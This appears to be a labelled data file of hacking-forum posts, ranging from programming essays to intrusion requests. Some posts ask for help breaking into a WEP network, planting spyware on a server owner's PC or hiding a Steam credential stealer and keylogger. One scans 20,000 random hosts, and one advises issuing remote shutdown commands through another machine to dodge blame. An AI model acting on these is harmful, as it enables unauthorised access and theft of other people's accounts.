in pure functional programming there are no switch, if-else, continue, try, catch, break, goto, etc control structures, there are also no for, while or do-while looping constructs, variables are typically immutable (meaning their value can never change) and there are no such things as statements. ok, so if you don’t know anything about functional programming, that last statement should have you up in arms screaming something along the lines of “wtf kind of crack are you smoking!? how can you write effective code without any of those things?”. we’ll id be obligated to tell you that you don’t need any of that nonsense to write the most powerful, beautiful and concise code. take the following c++ and haskell code into consideration. code:  select all // fibonacci numbers, imperative style int fibonacci(int iterations) {  int first=0, second=1;  for (int i=0; i<iterations; ++i)  {   int sum = first + second;   first = second;   second = sum;  }  return first; } std::cout << fibonacci(10) << """"; code:  select all // haskell fibonacci = fibrec 0 1             where fibrec a b = a : fibrec b (a + b) main = print (fibonacci !! 9) compared to the functional haskell code the imperative style c++ code looks scary and just takes up way to much real estate on my screen. the imperative c++ style has to describe what it has to do in terms of book keeping and modifying state to derive the desired value, while the functional implementation in haskell _only_ describes what must be done to derive the output from the input. one can argue that the iterative nature of the c++ solution is far more efficient and my instant response to that would be to ask to what means is it more efficient? statistics would say they’d argue that it’s more efficient from a computational stand point and i would say it’s less efficient from a productivity stand point. my laptop can iterate over each of those functions hundreds of thousands of times per second, while i can shamefully only type about a line of code every other second. so unless im running either of those trillions of times, i could care less about the iterative one being slightly faster. most functional languages out perform most non functional languages anyways. (  http://shootout.alioth.debian.org/u32/w ... astest.php  ).  l2 loopdeloop it turns out that the `for` loop is a horrible language construct. i say this because just by looking at the initialization line of a for loop you can’t derive much meaning from it other then that it’s going to be looping until some desired sate is achieved. functional languages perform iteration by expressively stating the type of iteration taking place. yeah, don’t look too confused i did say type of iteration and no i’m not saying that `while` and `for` are different types of iteration because they’re not. what it all boils down to is that there are three main types of iteration: transformation, filtering and reduction. a transformation walks an array/list and applies a transformation to each item. in most functional languages this is whats known as a map. in haskell specifically the map function takes a function as it’s first argument and a list as it’s second and as you can imagine it walks the list and applies the function to each item in the list, returning a completely different list. the following code in haskell demonstrates a transformation by taking a list of integers and doubles each item. code:  select all double (x:xs) = map (*2) (x:xs) main = print (double [1..10]) just in case you’re wondering how the map function is able to iterate over the list without built in language looping construct i’ll show you the function definition for map and go over it. code:  select all map _ [] = [] map f (x:xs) = f x : map f xs the syntax might be confusing if you’ve never picked up haskell before. the first line is the terminal condition that says “hey, if we have a blank list return a blank list”. the second line is where all the magic happens. basically the second line is applying the function `f` that you passed in to the head element of the list and then tail recursively calling map with the same function on the remainder of the list gluing elements together along the way with the list building colon operator. the second type of iteration is known as reduction. reduction takes an array/list of data and reduces it down to typically a . in haskell this is oddly named as a fold but in most other functional implementations it’s known as a reduction and they’re the same thing. the following sum function is kind of a text book example of a reduction. code:  select all sum (x:xs) = foldl (+) 0 (x:xs) basically that function takes a list of numbers and immediately applies it to a foldl function with the first argument as the addition function (yes addition is a function) zero as the initial value (that will become the accumulator) and a list of numbers. if you were to take a stab at how the foldl function is defined and you roughly came up with the following answer you’d be spot on. code:  select all foldl f x (y:ys) = fldl x (y:ys)                    where fldl a [] = a                          fldl a   (b:bs) = fldl (f a b) bs this ones slightly more advanced, but using basic mathematical expansion you can easily deduce what it’s doing, which is an exercise ill leave up to you. the last main type of iteration is whats known as filtering. the act of filtering a set/range of data is where you iterate through the data set and based on supplied conditional logic you either include or exclude each item in your return data set. the following function in haskell takes a list of numbers and filters out all even numbers returning the list you pass in with only odd numbers left, i’ll give you the entire program in one go this time. code:  select all onlyodds (x:xs) = filter (odd) (x:xs) filter _pred []    = [] filter pred (x:xs)   | pred x = x : filter pred xs   | otherwise = filter pred xs even n  =  n `rem` 2 == 0 odd =  not . even the filter and both the even and odd functions are defined in the standard haskell library and included by default. so in true to form real world haskell, this would be a 1 line program and the onlyodds function would be the only one i’d have to write. from the bottom up. you might have noticed something interesting from the haskell function on filtering we just went over. it’s built from the bottom up! what i mean by this is that functional code is first written in small easily testable and extend-able pieces of code. advanced meaningful functions are typically just various compositions of smaller functions that are composed of smaller functions etc etc. odds are in other programming paradigms you end up creating tons of functions/classes that do one offs of something else you’ve done elsewhere. such one off code is discouraged by the fundamental design of functional languages. as a matter of fact, you have to go out of your way to write code that isn’t reusable in a functional language. you might be saying “reusable code isn’t a problem for me, i use libraries”, you would be a very wise man. as a matter of fact any type of coding that makes heavy use of libraries may indeed be considered a bottom up design despite how pure  the actual reality of it is. writing code bottom up also has other advantages. it makes refactoring code very easy and almost automatic at times. for example, if you get a new business rule that effects some lower echelon of code, you can go and just change that function definition in that one and only one place and it will automatically effect wherever that function is used. -- to be continued --  to read in the meantime: http://www.learnyouahaskell.com http://www.learnyousomeerlang.com"

0	Java implement and extends	"hello everyone, i have recently realized that if i do not practice the java i had learned over the year, i will lose a good majority of what i have learned. sadly, i am now rusty on the uses of the implementation and extends in java. i was trying to remember back when my professor gave us an assignment to create a bank account program that used three files to complete the program. i have been searching google for examples of this type of program, but i have only found different ways to do it. could anyone provide an explanation or demonstration on using implementation and extends  or link me to a good tutorial for it? -- fri apr 15, 2011 3:14 am -- hello everyone, since then i have done a bit of research and have decided that i would narrow down my question to extends.  in the file that extends the super class, isnt that where you would declare actual number or strings to variables in the super class? i am under the impression that the super class is the file where the basic guidelines of your program are laid out and that when you have a file extending the super class, it adds the details to the variables in the super class. for example, if in the super class a person declares a username variable that is used throughout the constructors, accessors, and mutators, in the file that extends the super class, that person would declare the username to be something like ""bob"".  now my question is, if my concept about what extends is used for, how do you actually declare a variable from the super class a number or string(or character or anything else..)? i am working on an example similar to this except that it should calculate the area of a rectangle. here is what i have so far:  code:  select all public class rectangle { private int originalwidth; private int originallength; public rectangle(int originalwidth, int originalength){    width = originalwidth;    length = originallength; } public int getwidth(int width){    return width; } public void setwidth(int newwidth){    width = newwidth; } public int getlength(int length){    return length; } public void setlength(int newlength){    length = newlength; } public void showarea(){ system.out.println(length * width); }           }public class rectangle { private int originalwidth; private int originallength; public rectangle(int originalwidth, int originalength){    width = originalwidth;    length = originallength; } public int getwidth(int width){    return width; } public void setwidth(int newwidth){    width = newwidth;[code][/code] } public int getlength(int length){    return length; } public void setlength(int newlength){    length = newlength; } public void showarea(){ system.out.println(length * width); }           } here is the file that extends file ""rectangle""(the super class):  code:  select all public class tellrectangle extends rectangle{     public tellrectangle(){        super(int originallength, int originalwidth);             }         this file^ is of course not finished because it is the file that i am asking the question on.  if my concept of what extends does is totally wrong, please correct me so i dont go on learning the wrong thing. -- fri apr 15, 2011 3:55 am -- so, the variable details are declared in the superclass... if the variables are declared in the superclass, then the file extending does what? is that the file that would change any information?  then, would a ""driver"" file be created to output everything? -- fri apr 15, 2011 5:58 am -- hello everyone, thanks to goatboy and his epic teaching skills on the irc help channel, i have a much better understanding on what the hell i am trying to do here. there are still some things that i do not quite understand, and if you look at the syntax i have posted in this comment, you will see my questions/doubts. here is the syntax: code:  select all /**  * @(#)animalkingdom.java  *  *  * @author austin marstaller  * @version 1.00 2011/4/15  */ public class animalkingdom {  private string gender;  private int weight;  private string species;  //here is the constructor. the constructor makes the !general! object(s).  //could someone clarify if my variables have the correct quotations around them? it just does not look correct.  //are they even supposed to have quotations?  public animalkingdom(string gender, int weight, string species){     gender = ""gender"";     weight = ""weight"";     species = ""species"";  }  //here are the accessor functions. the accessor method provides a public !function! so that a 3rd party can fiddle with the private variables.  public string getgender(string gender){     return gender;  }  public int getweight(int weight){     return weight;  }  public string getspecies(string species){     return species;  }  //here are the mutator functions. the mutators change or ""mutate"" the variable information provided to them.  //on a side note, i am not sure about using params and the .this points in a mutator. i have never done such a thing.  //i believe that the .this points is having gender become g...but now i am confused because i have never done it this way.  public void setgender(g){     this.gender = g;  }  public void setweight(w){     this.weight = w;  }  public void setspecies(s){     this.species = s;  }  system.out.println(gender); } -- fri apr 15, 2011 3:01 pm -- hello everyone, i have proceeded to create two more files the extend the animalkingdom filer ( now referred as the base file ) and i have run into a few problems. first off, i will show you the syntax that i have created so far:  here is a file called ""canine"" that extends the base file:  code:  select all /**  * @(#)canine.java  *  *  * @author austin marstaller  * @version 1.00 2011/4/15  */ //this class is to specify details for the variables/objects created in the base class. public class canine extends animalkingdom{     public static void main(string[] args){ //creates an object called ""indy"" as well as giving it params for the base file.        canine indy = new canine(""male"",145,""canine"");     } } here is the ""driver"" file which will output anything i want outputted:  code:  select all /**  * @(#)animaldriver.java  *  *  * @author austin marstaller  * @version 1.00 2011/4/15  */ public class animaldriver extends animalkingdom{  public static void main(string[] args){     //to output the results of the canine file.     system.out.println(""the gender of the dog is: ""+indy.getgender());     system.out.println(""the weight of the dog is: ""+indy.getweight());     system.out.println(""the species of the dog is obviously: ""+indy.getsepcies());  } } now i know i am connecting the ""canine"" and ""animaldriver"" to the base file incorrectly some how. in one of the errors that was shown to me by the ide, it explained that i could not find the object/variable called ""indy"". this means that the animaldriver is not speaking to the canine file at all, or just incorrectly. here are the errors i was given:  code:  select all my documents\animaldriver.java:10: cannot find symbol symbol  : constructor animalkingdom() location: class animalkingdom public class animaldriver extends animalkingdom{        ^ c:\documents and settings\administrator\my documents\animaldriver.java:14: cannot find symbol symbol  : variable indy location: class animaldriver     system.out.println(""the gender of the dog is: ""+indy.getgender());                                                     ^ c:\documents and settings\administrator\my documents\animaldriver.java:15: cannot find symbol symbol  : variable indy location: class animaldriver     system.out.println(""the weight of the dog is: ""+indy.getweight());                                                     ^ c:\documents and settings\administrator\my documents\animaldriver.java:16: cannot find symbol symbol  : variable indy location: class animaldriver     system.out.println(""the species of the dog is obviously: ""+indy.getsepcies());                                                                ^ 4 errors i think that once a solution is reached about the connection of the two files to the base file, the other errors will be solved as well."

1	"Avoiding ""public"" network security"	well, first of all, i dont know nothing about informatic security, so please be simple to explain things, well as the title says i want to avoid some network security. when you connect from a wired connection, or even if you have the network password, you cannot enter, unless the admin wants it. so, i want to enter to the network without the admin permission, also, i used etherape with backtrack 5 r3, connected vía ethernet, and shows me all the computers connected to the network. can you help me please? pd: it has a wep password.
3	The Slander of Sandsphinx	"this is the skunkfoot from hbh that mr. sandsphinx apparently has a grudge against. he posted in a thread here on hts ( http://www.hackthissite.org/forums/viewtopic.php?f=76&t=3324 ) that i hacked some of his accounts and tried to humiliate him or something like that. i wouldve posted this in a reply to that thread, but the admin here at hts locked it (with good reason).  id like to officially say that i had nothing to do with this. i dont even know what ""bebo"" is...and even if i was one of those losers who ""hacks"" email accounts, why the hell would i pick mr. sandsphinx here? theres so much wrong with what he said, i dont even know where to begin... @sandsphinx: if i was the one fucking with you, i wouldnt tell you it was me, it wouldnt benefit me at all to claim responsibility for such a pitiful attempt at hacking. also, what proof do you have that i did what you said i did? any? did someone who called themselves ""skunkfoot"" contact you via msn or something? if so, it wasnt me, but i would still like to see that chat history. and you need to learn not to trust everything you hear on the internet, especially from incredible sources, (like the kind of people who ""hack"" email accounts and then try to gloat about it). my main point is this: dont go spreading rumors all over the internet about me, especially if you have no evidence to back what youre saying. also, stop being such a moron and just create a better password. if your account gets taken over, thats your fault for not securing it properly, dont blame everyone else. @hts admins: i would like his post deleted if at all possible, or at the very least, take my name out of it. thanks."

1	NetBIOS - Always filtered??	"hey, ive read up a bit on some methods that can be used to gain remote access.  ive been trying to do some penetration testing and found  that is very hard.  exploits that i find are generally to hard for me to understand, or simply execute dos attacks.  i dont like them because (a) thats skiddie like (although i dont know how to find exploits myself), or (b) do not help me in gaining access. so as i kept reading i learned (well, re-learned) about netbios and thought it would be an excelent way to start off (yes, its newb, but where else should i start off?) anyways i executed an nmap syn scan on about 20000 ips for port 139 (netbios).  of 20000, aprox. 1400 hosts were up. port 139 on all of these hosts were ""filtered"".  does this honestly mean that each and every one of them has some sort of firewall?  is there any way that i could connect to these ports (using nbtstat) to try and share files? if someone would be helpfull enough to explain why all 1461 hosts have port 139 filtered, i would be very thankfull. ps. nmap command: nmap -ss -p139 -d a.b.c.d -ir 20000"
3	My challenge (extreme difficulty)	hi there i have recently been contracted to secure a website for my political party after they have been hacked multiple times. i have secured it with as much skill as i know how, but they request to keep the phpmyadmin. ( *url removed for approval* ) . hackers have exploited this time and time again, but he is adement that this feature should stay on the site. recently data has been stolen from the site using this exploit and advanced sql injection.  there was a weakness that i discovered but it was impossible to patch. i need to know if this is easy for advanced pen-testers / hackers to find, so i know if i can just leave it or i must remove phpmyadmin totally. im not sure if leaving an incentive is allowed or not but if it is, ill pay $10 to anyone who manages to: a: detect problem b: suggest a way around it without removing phpmyadmin from the site. good luck all!
1	Friendly hacking - help will be gladly accepted! :)	"hi there. as i am rather new into this whole business, i am still in the learning process. - if you can not handle a question in the ""stupid"" category, - please leave this topic alone. that said, here is the case. i have a friend rl, who is trying to build his own page. i am trying to hack it, by using a variety of methods including all from injections to brute forcing and dictionary attacking. now, there are two questions this sums up to. before you go all crazy saying it is illegal or immoral, - it is not. we are both completely aware, and we both have given conscent to try out different methods. this is a learning process. the server sided code in the login, is: (btw: the site is still in developement. at the moment the password field does not work. the automatically encrypted password stored by mysql can not be retrieved it seems.) code:  select all if ($u && $p) {          $query = ""select user_id, first_name, last_name from users where username=$u"";          $result = @mysql_query($query);          $row = mysql_fetch_array ($result, mysql_num);                    if($row) {             $_session[first_name] = $row[1];             $_session[user_id] = $row[0];             $_session[last_name] = $row[2]; now, i can not get any injections to work, and as it uses addslashes in the input field, it is hard tricking this form. i would like the page to remain anonymous, due to the fact that some may be up to no good. also, when brute forcing i use the brutus software. my only question regarding this software, is how do i decide which protocol to use, i.e http basic, http form, ftp, pop3, telnet, netbus, etc. when using the ""form"" version of http, i get a positive authentication signal immediately on the first try. the only protocol i can get to work, is ftp, but it only gives me about 25 attempts per second. i used nmap to scan the site. are there any old tricks out there that could help me getting through this site? now, if you  do  think i myself am up to no good, please refrain from posting here. i can only underline that my intentions are solely for education purposes. - e"
3	Social Engineering 101	"i am not sure as to whether the lectures are still active or that there is a lack of presenters so i will try my luck through this thread. i have read through monicas (old) thread on lectures and it linked to this forum.  i fully understand the risks of practically carrying out the methods below. this lecture is for a better understanding of how a hacker can penetrate even through the strongest security systems without much technical skill. this lecture should provide a learner with a better understanding of how easily the human mind can be exploited and what to look out for. even the most advanced of security experts are vulnerable to psychological attacks which may lead to major it security breaches. i am not trying to imply that i know ""sure"" ways of how to get through a person. the human mind is very unpredictable and that cannot be emphasized enough. the best bet is to analyze the mentality and use your own educated judgement in order to predict the probability of the results. the following, are the topics (not limited to and not in sequence) id like to cover: social engineering (introduction)- hacking the weakest link in security on-screen psychology (spoofing your identity via the way you type, spoofing your online personality) psychological pattern analysis (spotting out vulnerabilities in the emotions and mindset of the target) psychological prediction and intuition (analysis of the probabilities of what the result of your stimuli may be) identity theft and identity spoofing (spoofing e-mail identities, web sites, social network accounts and administrative identities) lying: how to lie and sell it off-screen psychology (spoofing your identity in person) bluff interrogation & reverse interrogation recon and surveillance of public records and how to interpret them ""confusion is bliss!"" (blending lies with the truth) ""hey! i know you!"" (becoming friends before even talking to the person) emotion: the bug without a fix reverse social engineering my background: i am ex-military (used to work for an anti piracy unit for software and music...have a bit of know how on military intelligence), a computer enthusiast (i know a bit of web coding here and there), a businessman (current profession) and a prospective professional penetration tester (working on it). experience related to social engineering: i have worked with various online watchdogs (not specified for obvious reasons) and i enjoy baiting myself to social engineers and trolling them for weeks until i flame them and report them. as for off-screen social engineering, i have had to take up various identities and deceive a lot of people during my military employment for pirate raids. other than relevant hands-on experience, i have read through a lot of related books and web resources. if this lecture gets approved, i would like to invite anyone else who is interested in presenting with me. the lecture will be audio based. thank you for your time, ace"
1	Revenge (In an undetected non harmful way)	"so i used to play minecraft... a lot.. now i dont. but there was this one server i was on, got abused and all that stuff, owner pretty much gets free money, stuff was taken away that i paid (yes ik it is sad) and i just want to take off some of the people that i dont like and that i think are corrupt, i havent hacked before and i think this would be a decent way to start off. the only way to give myself unlimited power would be to take the server files, first i would need some kind of way to monitor the owners computer. i am capable of getting his ip. i was thinking, if it was possible, i am not going to do this cuz i dont want to buy sniper spy, but would it be possible, to make a backdoor ""virus"" that had sniper spy in it, inject it into the hosts computer silently and have sniper spy install automatically or from a command that is on my computer once the file is on, and once it is installed silently i can just copy the files to my computer, i would let him keep them, because ik how he is, he would never notice someone was screwing with the server just a little, i could probably even fix it, hes broken many things and i could probably even be better than him  . but if someone could help me just be able to get on his computer remotely and copy the files to my computer, that would be a nice challenge for mister challenge, thank you!"

3	The first bitcoin theft?	since goatboy always talks about it:  http://www.thinq.co.uk/2011/6/15/bitcoi ... 000-theft/ i mean, this could also be a fraud. you cant track whether he just wired the money to another account of his or not.... its very difficult to react to thefts and such, because theres no central instance that can control or at least see everything thats going on. what do you guys think? is this incident (which is still to be proven) endangering the success of the bitcoin system?
1	Appending Data	im working on a couple of c programs right now and have a few questions. first off, what is the best way to discreetly send somebody an exe file? i could always bind it with another file but then its an .exe anyways and most people know not to download suspicions exes. or anybody worth distributing these files to are smart enough to have file extensions visible. secondly?,in the past i made a steam account stealer that whipes out all the steam software and puts an exact replica in its place that uploads the user and pass to an ftp, it worked amazing. (not that i uhh used it 0.o) but then i decided to make it available to some other people on a hacking form and packaged it with a second exe that was used to edit the ftp credentials and self destruct time of the actual program. how i did this was append the text to the bottom of the exe file and the program would read its own text and parse the data at the bottom. it worked great but thats how i, uh they got caught, anybody could read the ftp data, which is bad. is there a better way to do this and keep it still in one file? because id like a keylogger to use this method but i would just do a series of encryption on the appended text to make it more secure. so....... is there a way to maybe use a dll and package them together? because ive never used dlls before so it would be a nice little learning experience. and plus binded files are discovered as trojans 99.99% of the time by any antivirus. thanks guys -- sun feb 28, 2010 1:40 am -- bump! its been 3 days and not one reply, most likely my fault and the fact that this isnt a programming bbs. but to reword the question in a better way, how do applications, such as ardamax keylogger/sub 7 and bo2k ( all those skiddie tools) go about having an editable server to be distributed by using a separate exe to change settings? please respond guys, ive done quite a bit of googling and binging to find the answer to this question but i couldnt find a thing on it so anybody that has any info, i would greatly appreciate it. xd
3	App 7	hi hts-community, im trying to complete the application mission 7, but the more i read the assembler-code-lines the more it seems to be unsolveable without using bruteforce. i found out that the decryption of the file depends on the hex-value of the input. i also know where this number is saved and which register is getting compared with the number. another thing i found out is, that the number decribes how often a loop is being passed. and there i see a problem: there seems to be no given number that describes how often the loop has to be passed... or am i wrong here? one possible solution seems to be, to bruteforce the number so that the decrypted string makes sense. im not able to realize this coz i would have to use inline assembling in my c-code and i have never worked with this... but there must be another solution, am i right? thanks for reading  schalla edit: i got it... after using a specific hex-value that i found in another thread i got the right password... sorry for this post - just delete it, if you want
3	Call For User Opinions	"so lately a lot has been going on here, and one of the things im most excited about is the recode being closer than ever to feature freeze (yay!).  however, ive been trying to get peoples opinions on how they want  the mission system to operate, since, apparently, a lot of people here have strong opinions as to how they think a good mission system works.  at this point, there are two prevailing ideas on how we should make it, but its not seeming to go any further.   the two are:  have the mission system randomized, where you choose a category (such as basic), and a mission is assigned to you.  once a mission is assigned to you, you cant move on in the category until you finish it.  in order to detour horrible assignments -- like a new user being assigned realistic 16 before realistic 2 -- it is planned to sort by difficulty.  e.g, you would only be assigned easy missions, and once youve finished those, youre only assigned moderate difficulty missions... and once youve finished all of the missions in the category, its completely random.  leave the mission system exactly the way it is now. there are lots of good arguments for either, but were more interested in yours. the second issue were debating on is whether or not to have a point system in the recode.  with user management being handed over to the forums more in the recode, actually changing the code of the forums would result in us being unable update the forums, which may include necessary security patches  (exactly of how it is now, basically).  although, thetan made some compelling points today about how important a point system is to the contribution to a website. thetan wrote: <bren2010> there is no more point system. <thetan> ....... <thetan> even worse implementation of game theory then <thetan> points == engaged users <thetan> thats how stackoverflow won the qa market <bren2010> points == noobs looking up answers to feel 1337. <thetan> stackoverflow.com understands the value of gamification <thetan> bren2010, removing points doesnt solve the problem <thetan> removing points masks the problem <thetan> what you have with noobs looking up answers is a failure of engineering <thetan> meaning, missions need to be reaxamined, some possibly thrown away even <thetan> and their needs to be my dynamic solutions <bren2010> then they can just look up the method to get the answer. <thetan> so? <thetan> isnt that 1/4 of what most hacking is <thetan> hey, this shit uses sql <thetan> lets look up how sql works <thetan> ok, lets check out sql injection <thetan> ok, now lets apply this <thetan> besides, a good point system wouldnt be strictly missions anyways <bren2010> in that case theyre learning sql to exploit it.  in the case im talking about, theyre looking up ""go to dontlook.php"", base64 decode the string it gives you...(several steps later) and then put that into the answer box. <thetan> content, posts, etc would be more valuable <thetan> bren2010, and that would go along with the missions that should be thrown away <thetan> missions should be minor points anyways <thetan> so that way you want to look 1337 you actually have to be 1337  <thetan> and that will be determined by your peers <thetan> and even more so by mods etc <thetan> this is why point systems like hackernews karma, reddits points and stackoverflows points are fueling practically all of their quality content for free <thetan> points == free work -> the most basic law of gamification <thetan> free is good <bren2010> ._. <thetan> awards == free sprints for milestones -> second basic law of gamification <thetan> ""give a man a colored ribbon and hed gladly die in combat for you"" - napolean  <thetan> ^^ that nigger knew game theory its not just me and thetan sparring in a staff channel, though -- a lot of people ive talked to on irc (in #hackthissite and #comdev mostly) have a strong opinion on either matter.  unfortunately, this isnt a very accurate measure of how the community as a whole feels.  one partition of the community doesnt have the continuous computer time to stay on irc all day, and another partition has the computer time to keep irc up in the background, but doesnt have the time to browse the forums.  hopefully, though, you can help me get an accurate measure of how the community feels about controversial issues were trying to fix in the recode."

3	Mistakes	"""an expert in any given field is simply someone who has made every mistake there is to make in that field.  what separates him from an imbecile is that he learns from his mistakes and does not repeat them."" my professor gave us that quote today.  its his version of a much older saying he picked up some time ago.  i believe there is a lot of truth and insight to this statement.  its one i will not soon forget, and i want to share why. a while back i was fuxing around during class seeing how much i could do on the network.  as a little background info, there are 20 desktops in the room, the professors computer, and 2 servers.  one day i was trying to map out the names of the computers.  i noticed that mine was \\m20 and the person up one and to my right was \\m18. from this, i deduced the layout of the room as compared to the names of the computers.  so naturally i started looking around, and noticed some fairly interesting things.  i wont list them all here, but one is that the remote shutdown command (shutdown /m \\computer) isnt blocked.  you can literally shut down any computer (even the professors) from any other computer. ill keep it short, but basically i picked a computer at random (happened to be \\m15) and shut it down.  a few seconds later, the guy in front of me and to the left looks back, red in the face, and starts cursing me under his breath.  "" you little fucker!  did you shut down my computer!?  why the fuck w- "" ad nauseam.  this went on for weeks. this little issue was resolved today when the guy apologized for his words and actions, and i can only assume were okay now.  but why did he get upset in the first place?  well, that much is obvious.  it was kind of a dick move on my part.  more importantly, what could i have done to avoid the issue and still  have some fun  test the network? its simple.  instead of doing it from my own account, i should have scheduled another computer to do it with an at command.  that way it would appear as if they had run the command.  instead, i did it right from my own computer and my account name showed up in the dialog box on his screen.  if i had just bounced my ""attack"" off another computer, the whole thing would have played out much differently, probably in my favor. now why is this important?  its such a small thing, how could it matter?  thats not the point.  size is not the issue here, its the change in my thinking.  some time in the future, i may run into a similar situation and avoid making the same mistake.  i dont beat myself up over making a mistake.  i dont dwell on it.  i learn from it.  and you should too. vote goat in 2010! also, feel free to admit your own mistakes and what you learned.  it feels good and then i dont feel so self-conscious"
2	Are these vulnerabilities?	im worried about a site my client is linking to.  its using javascript only to sanitize its user registration form, which goes into a locally hosted dll and ajax.  everything is visible and accessible from the browser, which doesnt seem safe to me.  is there any way for an attacker to gain access to or deface my clients site in a different domain on a different server? im also a little concerned about my clients site itself, as my client has been running an obnoxious spam campaign in well-known hacker hangouts.  its running php, apache 2.2.3 on centos.  theres only one publically accessible locally hosted page and the only links from it are to (1) a php script that redirects to the vulnerable partner and (2) some trashy javascript that tries to sucker the user into following the first link.  the main page accepts a user id as an argument, but it doesnt appear to do anything.  there are user inputs, but theyre never submitted. my client is also using the php version of geoip, for which i could swear i remember hearing about an exploit that allows read-only access to random users via unsanitized input.  all of the geoip scripts are accessible from the web; in addition, two initialization scripts reside in the same folder, init.php and lp_init.php, the latter of which seems to dish out 500 error codes. how much of this sounds vulnerable to you all?  my clients spam targets are well known for ddos attacks and defacement.  what would they use to get in?  what sort of payload are we vulnerable to?  how permanent would the damage be?

Hello	sorry if i got this in the wrong place, couldnt find an introduction area so i just kinda  barged  myself in here.        im   really  excited to get involved with this community. being the younger brother of a programmer, i was introduced to computer science at an early age. it fascinates me that people spend a lot of their lives on their computers nowadays but dont have a clue about what makes it  tick  .  when i first joined this site a few years back i was more naive and wanted to learn to hack right away.  now im more interesting in just learning how things function, its great that you can develop those skills here on this site without any legal problems. oh yeah~ im restricted to the computer so i pretty much sneak myself at night to learn till i get that burning headache. creepy right? hahahaha. anyways, just wanted to see if some of you guys can lend this noobie a hand so i can make better progress. im not looking for tools, just directions to learn. any help will be appreciated though. ahh, and my name is alexander by the way.
1	Block Ciphers, help please!	hello everyone, i am new to site, and also a n00b myself.  i am studying network security at the moment and trying to learn more about cryptography.  thus i am doing a paper on cryptography about block ciphers.  i am still trying to really understand them so i was wondering if anyone had any examples of a very simple block cipher like 4-bit.  that i could attempt to crack, also if you could provide a solution to check myself that would be great.  but i would like to show an example in my paper.  hope someone can help! thanks!!

1	Steal My Wi-Fi Will You? [Assistance Please]	"*disclaimer: i will not actually be doing any of this on anyone other then myself, the story just sounds nice*     well recently some jock-body-building-muscle-heads moved in next door.  every mans dream right?  wrong.  they seem like the typical cynical jackasses on jersey shore, but less tan.  anyway, i found out recently that they have been stealing my wi-fi.  well, two can play at that game.  i would be better off if i had physical access to the computer in question, but i do not.  i also believe this computer to be a laptop, which is bad news since i can never tell when its off/on (currently it is off).  well here is what i wish to do: create a standard ""shutdown"" program with notepad and somehow put it on his desktop (and make it look like firefox... (if thats what he uses) so that when he tries to open up the internet a message will display in dos stating something along the lines of ""steal my wi-fi.. blah blah blah... ill hack the hell out of you.. yadda yadda yadda"" im not sure, havent figured it out yet.  if he continues, then i plan to make another program in notepad and enable the deletion of all system32 files, which will effectively shut him off my network for good eh?  well sure i could just ban his mac address in my control panel and maybe enable security on it, but the problem with that is my signal drops significantly whenever i add security to it (such as wep) and besides, i shouldnt have to...  the admin panel is safe since i did not leave that at the default settings, but still this guy isnt exactly ""mr. nice guy"" so me and my diabolical brain went to thinking.  as for banning his mac address... well... where is the fun in that?     this is my ideal way to go, but i am always open to new ideas, as he is getting on my nerves in more ways then just this.  but i figure this is my chance to get him back so shoot some ideas at me    i like to learn new things, so feel free to throw anything you got at me. thank you in advance."
1	Windows 7 users, help me out....	hey, i was given a laptop that had vista on it and thought i would upgrade to 7 to see what it was like. i know very little about windows but as you know, its not hard to do and everything went smoothly. sort of. on checking the hard drive properties i saw that over 100gb of the available 139 were used, i had a look and saw that there were two folders on there called windows old and windows old.0000 or something similar, i chose to do a full clean install and so wasnt expecting anything of that nature but whatever, i deleted them and regained around 60gb. this leaves me with a disk that is showing 39gb of used disk space on a supposedly clean install. seems somewhat excessive. any ideas where my disc space has gone? what i have done: made all folders and drives visible in control panel, (the hidden folders only account for about 2gb max). here are the folders now showing on c:                                     $avg, hp, msocache, perflogs, programme files, programme data, swsetup,                                   system.sav, users, windows iph.ph does this seem normal? the avg thing seems to be a vault from a previous installation of the antivirus, so im thinking there could be some other artifacts lurking around. one other thing (as columbo once said), on installing, at the point where you are asked to choose the place to install, a 9gb partition showed up but when i tried to delete it the options were greyed out, so this may account for 9gig? sorry for being long winded, im just trying to give you as clear a picture as possible. thanks in advance, ed.
3	NAT Traversal	firstly, i wasnt sure where to put this thread so i am sorry if this is the wrong place. feel free to move it to where-ever it should be. i have been hearing/reading about nat traversal and firewall bypassing but most articles just talk about that its possible and  a follow-up solution is missing usually saying that its against security of something along the lines. i am particularly interested in knowing how nat traversal would take place if pat (port address translation) was being used. for example host a and host b both want to communicate with each other, and both know each others ip address. but due to pat, they wouldnt know what the source port has been translated to. for now just ignore that a firewall exists. another thing i am not sure about: suppose i send a udp packet with a very low ttl field and certain source port num1, and when it passes through nat (outgoing packet), the source port changes to num2. now i would receive a icmp ttl exceeded reply. the reply will contain the original udp packet and the router sending the reply will encapsulate the changed/translated port num2 in it. the reply will of course go through the nat (incoming packet) again but in the opposite direction. now my question is whether the nat device will look into the icmp payload and actually change udp port from num2 back to num2. if it doesnt then that means this could be used as a method to find out translated port number. the reason why i want to know all this is to make a file transfer app that allows ppl to share large files without using any 3rd party server, and without knowing anything about the router, isp, or firewall. hence someone whos not a computer techy could share files easily by using an application to do it for him. if there is a easier way then please share.
1	Need help on installing A Linux OS.	im new here in this community and also new to the world of hacking (meaning i have no learned programming languages/ super newbie), i have read that in order to learn and excel better at programming is to get a linux os since it is open-source and supports more programming languages, as i found; there are many howtos regarding installation, but i am fearful that an error might occur and i might not be able to setup the system properly or worse, it might destroy my computer; since compatibility among parts is different. so i am asking if anyone can physically help me on the installation if only possible (though i know it is a risk on both parties) near longbeach ca, or guide me thru forum to what are the possible things i might encounter and that nothing fatal will happen to my computer if i install it myself. any help is appreciated.

3	Being moral and shit	as we all have taken up the hobby of hacking, we all know that there are both legal and illegal ways to practice our skills. while it is usually a better choice to do it the legal way, going the illegal route generally provides a better challenge/practice. i personally enjoy just snooping around in places and things that i probably shouldnt be (personal opinion). im not asking you to out yourselves, as that would be a waste of a thread and time. i was just going to supply 3 scenarios and see how you guys would go about these: 1. the cp: lets say that youre a poor, starving college student as many of us are, and cant afford cable. you decide to put your hacking skillz to some good use and get yourself some internet from your rich, annoying neighbor. you know that theres a 1% chance of getting caught, as he just learned what a computer was last year. when you finally get the password into his network, you connect on up. but, you cant help but feel mischievous, cause, come on, youre a mischievous person. so, you load up your good ol nmap, and do a quick port scan. this scan happens to reveal that he has a vulnerable port open. after doing some hacking-fu, you start your snooping. it quickly becomes obvious that he not only has several hundreds of gigabytes of cp (child porn) on his computer, and has starred in about 50 more. he appears to also have a fancy for getting drunk and abusing children. his grand-children are coming over for a week long visit next week, which you know, from your recent discovery, can only end terribly. if you call the police, theyll want to know how you got your information, and youll get booked for hacking. but, if you dont tell the police, innocent children will possibly be raped and abused. wat do? 2. the idiotic company: while browsing the internet one 